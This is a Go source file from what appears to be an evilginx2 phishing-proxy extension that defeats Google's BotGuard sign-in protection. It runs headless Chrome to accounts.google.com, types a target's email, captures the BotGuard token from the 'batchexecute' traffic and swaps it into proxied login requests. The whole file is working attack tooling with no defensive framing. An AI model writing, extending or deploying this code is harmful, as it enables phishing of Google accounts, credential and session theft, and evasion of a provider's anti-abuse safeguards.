package core

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/proto"
	"github.com/kgretzky/evilginx2/log"
)

type GoogleBypass struct {
	browser   *rod.Browser
	page      *rod.Page
	token     string
	mu        sync.Mutex
	chromeCmd *exec.Cmd
	running   bool
}

func NewGoogleBypass() *GoogleBypass {
	return &GoogleBypass{}
}

func (gb *GoogleBypass) Start() error {
	gb.mu.Lock()
	defer gb.mu.Unlock()

	if gb.running {
		return nil
	}

	chromePath := gb.findChrome()
	if chromePath == "" {
		return fmt.Errorf("google-chrome not found. install with: sudo apt install -y google-chrome-stable")
	}

	// Kill any stale Chrome debug instances
	exec.Command("pkill", "-f", "google-chrome.*--remote-debugging-port=9222").Run()
	time.Sleep(500 * time.Millisecond)

	gb.chromeCmd = exec.Command(chromePath,
		"--remote-debugging-port=9222",
		"--no-sandbox",
		"--disable-gpu",
		"--disable-dev-shm-usage",
		"--disable-setuid-sandbox",
		"--headless=new",
		"--window-size=1920,1080",
		"--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	)

	gb.chromeCmd.Stdout = io.Discard
	gb.chromeCmd.Stderr = io.Discard

	if err := gb.chromeCmd.Start(); err != nil {
		return fmt.Errorf("failed to start chrome: %v", err)
	}

	// Poll for Chrome's debug port to be ready (up to 30s)
	var portReady bool
	for i := 0; i < 60; i++ {
		conn, err := net.Dial("tcp", "127.0.0.1:9222")
		if err == nil {
			conn.Close()
			portReady = true
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if !portReady {
		gb.stopUnlocked()
		return fmt.Errorf("chrome did not open debug port 9222 within 30s (OOM or crash?)")
	}

	// Fetch the exact WebSocket URL from Chrome's DevTools HTTP endpoint
	wsURL, err := gb.getChromeWS()
	if err != nil {
		gb.stopUnlocked()
		return fmt.Errorf("failed to get chrome websocket url: %v", err)
	}

	// Connect via rod with a 10s timeout
	browser := rod.New().ControlURL(wsURL)

	done := make(chan error, 1)
	go func() {
		done <- browser.Connect()
	}()

	select {
	case err := <-done:
		if err != nil {
			gb.stopUnlocked()
			return fmt.Errorf("failed to connect to chrome: %v", err)
		}
	case <-time.After(10 * time.Second):
		gb.stopUnlocked()
		return fmt.Errorf("timeout connecting to chrome debugger")
	}

	gb.browser = browser
	gb.running = true
	log.Info("google bypass: chrome ready")
	return nil
}

func (gb *GoogleBypass) Stop() {
	gb.mu.Lock()
	defer gb.mu.Unlock()
	gb.stopUnlocked()
}

func (gb *GoogleBypass) stopUnlocked() {
	if gb.page != nil {
		gb.page.Close()
		gb.page = nil
	}
	if gb.browser != nil {
		gb.browser.Close()
		gb.browser = nil
	}
	if gb.chromeCmd != nil && gb.chromeCmd.Process != nil {
		gb.chromeCmd.Process.Kill()
		gb.chromeCmd = nil
	}
	gb.running = false
}

func (gb *GoogleBypass) getChromeWS() (string, error) {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("http://127.0.0.1:9222/json/version")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("chrome version endpoint returned %d", resp.StatusCode)
	}

	var ver struct {
		WebSocketDebuggerURL string `json:"webSocketDebuggerUrl"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&ver); err != nil {
		return "", err
	}
	if ver.WebSocketDebuggerURL == "" {
		return "", fmt.Errorf("chrome did not return webSocketDebuggerUrl")
	}
	return ver.WebSocketDebuggerURL, nil
}

func (gb *GoogleBypass) findChrome() string {
	candidates := []string{
		"google-chrome-stable",
		"google-chrome",
		"chromium-browser",
		"chromium",
		"/usr/bin/google-chrome-stable",
		"/usr/bin/google-chrome",
		"/usr/bin/chromium-browser",
		"/usr/bin/chromium",
		"/opt/google/chrome/google-chrome",
	}
	for _, c := range candidates {
		if path, err := exec.LookPath(c); err == nil {
			return path
		}
	}
	return ""
}

// GetToken launches a headless Chrome page, navigates to Google, enters the email,
// and captures the BotGuard token from the browser's network traffic.
func (gb *GoogleBypass) GetToken(email string) (string, error) {
	if !gb.running {
		return "", fmt.Errorf("bypass not running")
	}

	gb.mu.Lock()
	defer gb.mu.Unlock()

	gb.token = ""
	stop := make(chan struct{})
	var once sync.Once

	// Create a fresh page for each token request
	page, err := gb.browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
	if err != nil {
		return "", fmt.Errorf("failed to create page: %v", err)
	}
	gb.page = page

	// Enable network events
	_ = proto.NetworkEnable{}.Call(page)

	// Listen for the batchexecute request containing the token
	go page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		if strings.Contains(e.Request.URL, "batchexecute") {
			postData := e.Request.PostData
			if postData != "" {
				decoded, _ := url.QueryUnescape(postData)
				if decoded == "" {
					decoded = postData
				}

				// Only capture if this request contains the target email
				if strings.Contains(decoded, email) || strings.Contains(decoded, strings.ReplaceAll(email, "@", "%40")) {
					// Extract token: look for a long base64-like string near the email
					if tok := extractToken(decoded, email); tok != "" {
						gb.token = tok
						log.Debug("google bypass: captured token for %s", email)
						once.Do(func() { close(stop) })
					}
				}
			}
		}
	})()

	// Navigate and submit email
	log.Debug("google bypass: navigating for email: %s", email)
	if err := page.Navigate("https://accounts.google.com/"); err != nil {
		page.Close()
		return "", fmt.Errorf("navigate failed: %v", err)
	}
	page.MustWaitLoad()

	el, err := page.Element("#identifierId")
	if err != nil {
		page.Close()
		return "", fmt.Errorf("email field not found: %v", err)
	}

	if err := el.Input(email); err != nil {
		page.Close()
		return "", fmt.Errorf("input failed: %v", err)
	}

	if err := page.Keyboard.Press(input.Enter); err != nil {
		page.Close()
		return "", fmt.Errorf("submit failed: %v", err)
	}

	// Wait for token capture or timeout
	select {
	case <-stop:
		break
	case <-time.After(15 * time.Second):
		page.Close()
		return "", fmt.Errorf("timeout waiting for token")
	}

	tok := gb.token
	page.Close()
	gb.page = nil

	if tok == "" {
		return "", fmt.Errorf("token extraction failed")
	}
	return tok, nil
}

func extractToken(body string, email string) string {
	// Strategy: find the email in the body, then look in the next window
	// for a large quoted string that is likely the BotGuard token.
	idx := strings.Index(body, email)
	if idx == -1 {
		// Try with URL-encoded @
		encEmail := strings.ReplaceAll(email, "@", "%40")
		idx = strings.Index(body, encEmail)
		if idx == -1 {
			return ""
		}
	}

	// Look at the next 800 characters after the email
	end := idx + 800
	if end > len(body) {
		end = len(body)
	}
	window := body[idx:end]

	// Find the longest quoted alphanumeric-ish string (100-800 chars)
	// BotGuard tokens are typically 200-600 characters
	re := regexp.MustCompile(`"([A-Za-z0-9_\-+/=]{100,800})"`)
	matches := re.FindAllStringSubmatch(window, -1)
	if len(matches) == 0 {
		return ""
	}

	// Return the longest match (most likely the token)
	longest := ""
	for _, m := range matches {
		if len(m) > 1 && len(m[1]) > len(longest) {
			longest = m[1]
		}
	}
	return longest
}

// ReplaceBotGuardToken replaces the old BotGuard token in the request body
// with the fresh token obtained from the real browser.
func ReplaceBotGuardToken(body string, email string, newToken string) string {
	// Find the email in the body
	idx := strings.Index(body, email)
	if idx == -1 {
		// Try with URL-encoded @
		encEmail := strings.ReplaceAll(email, "@", "%40")
		idx = strings.Index(body, encEmail)
		if idx == -1 {
			return body
		}
	}

	// Look in the next 800 chars for a large quoted token-like string
	end := idx + 800
	if end > len(body) {
		end = len(body)
	}
	window := body[idx:end]

	// BotGuard tokens are long base64-like strings
	re := regexp.MustCompile(`"([A-Za-z0-9_\-+/=]{100,800})"`)
	matches := re.FindAllStringSubmatchIndex(window, -1)
	if len(matches) == 0 {
		return body
	}

	// Use the longest match as the token
	best := matches[0]
	bestLen := best[3] - best[2]
	for _, m := range matches[1:] {
		l := m[3] - m[2]
		if l > bestLen {
			best = m
			bestLen = l
		}
	}

	// Calculate absolute positions
	tokStart := idx + best[2]
	tokEnd := idx + best[3]

	return body[:tokStart] + newToken + body[tokEnd:]
}
